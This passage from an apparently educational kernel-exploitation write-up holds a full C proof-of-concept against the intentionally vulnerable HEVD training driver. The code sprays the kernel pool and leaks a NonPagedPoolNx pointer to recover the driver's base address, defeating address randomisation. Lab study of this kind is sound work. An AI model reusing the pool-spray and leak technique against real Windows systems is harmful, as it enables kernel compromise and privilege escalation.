<span class="normal"><a href="#__codelineno-22-121">121</a></span>
<span class="normal"><a href="#__codelineno-22-122">122</a></span>
<span class="normal"><a href="#__codelineno-22-123">123</a></span>
<span class="normal"><a href="#__codelineno-22-124">124</a></span>
<span class="normal"><a href="#__codelineno-22-125">125</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
<a id="__codelineno-22-2" name="__codelineno-22-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<a id="__codelineno-22-3" name="__codelineno-22-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Psapi.h&gt;</span><span class="cp"></span>
<a id="__codelineno-22-4" name="__codelineno-22-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<a id="__codelineno-22-5" name="__codelineno-22-5"></a>
<a id="__codelineno-22-6" name="__codelineno-22-6"></a><span class="cp">#define DRIVER &quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>
<a id="__codelineno-22-7" name="__codelineno-22-7"></a><span class="cp">#define IOCTL_CODE 0x0022204f</span>
<a id="__codelineno-22-8" name="__codelineno-22-8"></a><span class="cp">#define IOCTL_UAF 0x00222053</span>
<a id="__codelineno-22-9" name="__codelineno-22-9"></a>
<a id="__codelineno-22-10" name="__codelineno-22-10"></a><span class="cm">/* Function to open a handle to the driver */</span><span class="w"></span>
<a id="__codelineno-22-11" name="__codelineno-22-11"></a><span class="n">HANDLE</span><span class="w"> </span><span class="nf">OpenDriverHandle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-12" name="__codelineno-22-12"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-13" name="__codelineno-22-13"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-14" name="__codelineno-22-14"></a>
<a id="__codelineno-22-15" name="__codelineno-22-15"></a><span class="w">    </span><span class="cm">/* Opens handle to driver */</span><span class="w"></span>
<a id="__codelineno-22-16" name="__codelineno-22-16"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">DRIVER</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-17" name="__codelineno-22-17"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span><span class="c1">// If handle cant open, exit.</span>
<a id="__codelineno-22-18" name="__codelineno-22-18"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-19" name="__codelineno-22-19"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[!] FATAL: Failed to open driver handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-20" name="__codelineno-22-20"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-21" name="__codelineno-22-21"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-22" name="__codelineno-22-22"></a><span class="w">    </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-22-23" name="__codelineno-22-23"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-24" name="__codelineno-22-24"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Opened Driver Handle: 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-25" name="__codelineno-22-25"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"> </span><span class="c1">// Return handle to driver to be used later.</span>
<a id="__codelineno-22-26" name="__codelineno-22-26"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-27" name="__codelineno-22-27"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-28" name="__codelineno-22-28"></a>
<a id="__codelineno-22-29" name="__codelineno-22-29"></a><span class="kt">void</span><span class="w"> </span><span class="nf">PoolSpray</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-30" name="__codelineno-22-30"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-31" name="__codelineno-22-31"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w">  </span><span class="n">EventObjects</span><span class="p">[</span><span class="mi">5000</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-22-32" name="__codelineno-22-32"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">BytesReturned</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-33" name="__codelineno-22-33"></a>
<a id="__codelineno-22-34" name="__codelineno-22-34"></a><span class="w">    </span><span class="cm">/* Spray 10,000 Event Objects and 10,000 UAF Objects */</span><span class="w"></span>
<a id="__codelineno-22-35" name="__codelineno-22-35"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">5000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-36" name="__codelineno-22-36"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-37" name="__codelineno-22-37"></a><span class="w">        </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">EventHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateEventA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-38" name="__codelineno-22-38"></a><span class="w">        </span><span class="n">EventObjects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EventHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-39" name="__codelineno-22-39"></a>
<a id="__codelineno-22-40" name="__codelineno-22-40"></a><span class="w">        </span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_UAF</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-41" name="__codelineno-22-41"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-42" name="__codelineno-22-42"></a><span class="w">    </span><span class="c1">//DeviceIoControl(DriverHandle, IOCTL_UAF, NULL, 0, NULL, 0, &amp;BytesReturned, NULL);</span>
<a id="__codelineno-22-43" name="__codelineno-22-43"></a>
<a id="__codelineno-22-44" name="__codelineno-22-44"></a><span class="w">    </span><span class="cm">/* Free event objects */</span><span class="w"></span>
<a id="__codelineno-22-45" name="__codelineno-22-45"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">5000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-46" name="__codelineno-22-46"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-47" name="__codelineno-22-47"></a><span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">EventObjects</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-22-48" name="__codelineno-22-48"></a><span class="w">        </span><span class="n">EventObjects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-49" name="__codelineno-22-49"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-50" name="__codelineno-22-50"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-51" name="__codelineno-22-51"></a>
<a id="__codelineno-22-52" name="__codelineno-22-52"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-53" name="__codelineno-22-53"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-54" name="__codelineno-22-54"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">           </span><span class="n">BytesReturned</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-55" name="__codelineno-22-55"></a><span class="w">    </span><span class="kt">char</span><span class="w">            </span><span class="n">OutputBuffer</span><span class="p">[</span><span class="mh">0x270</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-22-56" name="__codelineno-22-56"></a><span class="w">    </span><span class="n">ULONGLONG</span><span class="w">       </span><span class="n">HevdBaseAddress</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-57" name="__codelineno-22-57"></a>
<a id="__codelineno-22-58" name="__codelineno-22-58"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">search</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Hack&quot;</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-59" name="__codelineno-22-59"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">pos_search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-60" name="__codelineno-22-60"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">pos_text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-61" name="__codelineno-22-61"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">len_search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-62" name="__codelineno-22-62"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">len_text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x270</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-63" name="__codelineno-22-63"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">Match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-64" name="__codelineno-22-64"></a>
<a id="__codelineno-22-65" name="__codelineno-22-65"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Starting pool spray!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-66" name="__codelineno-22-66"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-67" name="__codelineno-22-67"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-68" name="__codelineno-22-68"></a><span class="w">        </span><span class="n">PoolSpray</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-69" name="__codelineno-22-69"></a><span class="w">        </span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">OutputBuffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">OutputBuffer</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-70" name="__codelineno-22-70"></a>
<a id="__codelineno-22-71" name="__codelineno-22-71"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">pos_text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">pos_text</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len_text</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">len_search</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">pos_text</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-72" name="__codelineno-22-72"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-73" name="__codelineno-22-73"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">OutputBuffer</span><span class="p">[</span><span class="n">pos_text</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">search</span><span class="p">[</span><span class="n">pos_search</span><span class="p">])</span><span class="w"></span>
<a id="__codelineno-22-74" name="__codelineno-22-74"></a><span class="w">            </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-75" name="__codelineno-22-75"></a><span class="w">                </span><span class="o">++</span><span class="n">pos_search</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-76" name="__codelineno-22-76"></a><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos_search</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">len_search</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-77" name="__codelineno-22-77"></a><span class="w">                </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-78" name="__codelineno-22-78"></a><span class="w">                    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[!] Match from %d to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">pos_text</span><span class="o">-</span><span class="n">len_search</span><span class="p">,</span><span class="w"> </span><span class="n">pos_text</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-79" name="__codelineno-22-79"></a><span class="w">                    </span><span class="n">Match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-80" name="__codelineno-22-80"></a><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-81" name="__codelineno-22-81"></a><span class="w">                </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-82" name="__codelineno-22-82"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-83" name="__codelineno-22-83"></a><span class="w">            </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-22-84" name="__codelineno-22-84"></a><span class="w">            </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-85" name="__codelineno-22-85"></a><span class="w">                </span><span class="n">pos_text</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">pos_search</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-86" name="__codelineno-22-86"></a><span class="w">                </span><span class="n">pos_search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-87" name="__codelineno-22-87"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-88" name="__codelineno-22-88"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-89" name="__codelineno-22-89"></a>
<a id="__codelineno-22-90" name="__codelineno-22-90"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Match</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">TRUE</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-91" name="__codelineno-22-91"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-92" name="__codelineno-22-92"></a><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x270</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-93" name="__codelineno-22-93"></a><span class="w">            </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-94" name="__codelineno-22-94"></a><span class="w">                </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">UOutputBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-95" name="__codelineno-22-95"></a><span class="w">                </span><span class="n">UOutputBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">OutputBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-96" name="__codelineno-22-96"></a><span class="w">                </span><span class="c1">//printf(&quot;0x%llx\n&quot;, UOutputBuffer[i]);</span>
<a id="__codelineno-22-97" name="__codelineno-22-97"></a>
<a id="__codelineno-22-98" name="__codelineno-22-98"></a><span class="w">                </span><span class="cm">/* Check if we leaked kernel address */</span><span class="w"></span>
<a id="__codelineno-22-99" name="__codelineno-22-99"></a><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">UOutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfffff00000000000</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xfffff00000000000</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-22-100" name="__codelineno-22-100"></a><span class="w">                </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-101" name="__codelineno-22-101"></a><span class="w">                    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Address of HEVD!UaFObjectCallback: 0x%llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UOutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-22-102" name="__codelineno-22-102"></a><span class="w">                    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Base Address of HEVD: 0x%llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">UOutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x880C0</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-103" name="__codelineno-22-103"></a>
<a id="__codelineno-22-104" name="__codelineno-22-104"></a><span class="w">                    </span><span class="c1">// 0: kd&gt; ? 0xfffff8051b3880c0 - HEVD</span>
<a id="__codelineno-22-105" name="__codelineno-22-105"></a><span class="w">                    </span><span class="c1">// Evaluate expression: 557248 = 00000000`000880c0</span>
<a id="__codelineno-22-106" name="__codelineno-22-106"></a><span class="w">                    </span><span class="n">HevdBaseAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UOutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x880C0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-107" name="__codelineno-22-107"></a><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-108" name="__codelineno-22-108"></a><span class="w">                </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-109" name="__codelineno-22-109"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-110" name="__codelineno-22-110"></a><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-22-111" name="__codelineno-22-111"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-112" name="__codelineno-22-112"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-113" name="__codelineno-22-113"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Closing handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-114" name="__codelineno-22-114"></a><span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-115" name="__codelineno-22-115"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-22-116" name="__codelineno-22-116"></a>
<a id="__codelineno-22-117" name="__codelineno-22-117"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-22-118" name="__codelineno-22-118"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-22-119" name="__codelineno-22-119"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] HEVD: NonPagedPoolNx Memory Disclosure!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-120" name="__codelineno-22-120"></a>
<a id="__codelineno-22-121" name="__codelineno-22-121"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Opening handle to the driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-122" name="__codelineno-22-122"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenDriverHandle</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-22-123" name="__codelineno-22-123"></a>
<a id="__codelineno-22-124" name="__codelineno-22-124"></a><span class="w">    </span><span class="n">exploit</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-22-125" name="__codelineno-22-125"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p><a class="md-button md-button--primary" href="https://github.com/LinxzSec/Kernel-Exploits/blob/main/HEVD/NonPagedPoolNxMemoryDisclosure.c">Exploit on <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span> </a></p>
<hr>

<h1 id="acknowledgements">Acknowledgements<a class="headerlink" href="#acknowledgements" title="Permanent link">&para;</a></h1>
<p>Thanks to myself for putting up with myself trying lots of very dumb ideas.</p>
<hr>

<h1 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h1>
<ul>
<li>[1] - <a href="https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol">https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol</a></li>
<li>[2] - <a href="https://stackoverflow.com/questions/13450809/how-to-search-a-string-in-a-char-array-in-c">https://stackoverflow.com/questions/13450809/how-to-search-a-string-in-a-char-array-in-c</a></li>
<li>[3] = <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.c">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/<abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr>/Windows/MemoryDisclosureNonPagedPoolNx.c</a></li>
</ul>

  
  




  



                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            Back to top
          </a>
        
      </main>
      
        <footer class="md-footer">
  
    
      
    
    <nav class="md-footer__inner md-grid" aria-label="Footer" >
      
        
